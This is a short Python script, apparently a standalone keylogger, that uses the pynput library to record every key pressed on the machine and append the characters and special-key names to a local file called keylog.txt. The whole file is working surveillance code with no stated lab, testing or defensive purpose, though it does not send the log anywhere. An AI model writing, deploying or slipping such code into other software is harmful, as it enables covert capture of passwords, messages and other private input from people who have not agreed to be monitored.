import pynput.keyboard
from pynput.keyboard import Key

# Define a log file to store key presses
LOG_FILE = "keylog.txt"

# Create a function to log key presses
def on_key_press(key):
    try:
        # Check if the key is a special key (e.g., Enter, Space, etc.)
        if hasattr(key, 'char'):
            # Write printable characters to the log file
            with open(LOG_FILE, "a") as log_file:
                log_file.write(key.char)
        else:
            # Handle special keys (e.g., Enter, Space) as needed
            with open(LOG_FILE, "a") as log_file:
                log_file.write(f"[{key}]")
    except Exception as e:
        print(f"Error: {e}")

# Create a function to log key releases
def on_key_release(key):
    pass

# Create a listener for the keyboard
keyboard_listener = pynput.keyboard.Listener(
    on_press=on_key_press,
    on_release=on_key_release
)

def main():
    try:
        # Start the listener
        with keyboard_listener as listener:
            listener.join()
    except KeyboardInterrupt:
        print("Keyboard listener terminated.")

if __name__ == "__main__":
    main()

